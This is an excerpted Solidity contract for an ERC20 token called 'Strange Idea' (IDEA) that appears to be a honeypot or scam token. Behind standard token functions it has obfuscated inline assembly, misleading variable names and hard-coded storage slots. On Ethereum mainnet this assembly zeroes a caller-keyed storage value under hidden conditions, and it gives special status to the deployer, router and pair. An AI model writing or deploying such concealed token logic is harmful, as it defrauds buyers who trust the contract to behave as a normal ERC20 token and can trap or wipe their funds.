...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addIdea;
    uint256 private _goodIdeal = block.number*2;

    mapping (address => bool) private _firstStrike; 
    mapping (address => bool) private _secondBomb;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private appleComputer;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private windowsServer;
    address public pair;
    ...
    bool private trading; uint256 private killBill = 1; bool private goodStuff;
    uint256 private _decimals; uint256 private forWin;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addIdea.push(_router); addIdea.push(msgSender_); addIdea.push(pair);
        for (uint256 q=0; q < 3;) {_firstStrike[addIdea[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x15F)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x348b2950ea2ea3f00d26c31bcca735b5cc7584e55c848f41ff1d1c00793d1c66
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x112c738e9a7bedd996ba1391cab6a6692e80319584c0e3c217c05544c5a25cae,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _goodIdeal = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addIdea[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployIdea(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addIdea[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployIdea(creator, initialSupply);
    }
}

contract StrangeIdea is ERC20Token {
    constructor() ERC20Token("Strange Idea", "IDEA", msg.sender, 28500 * 10 ** 18) {
    }
}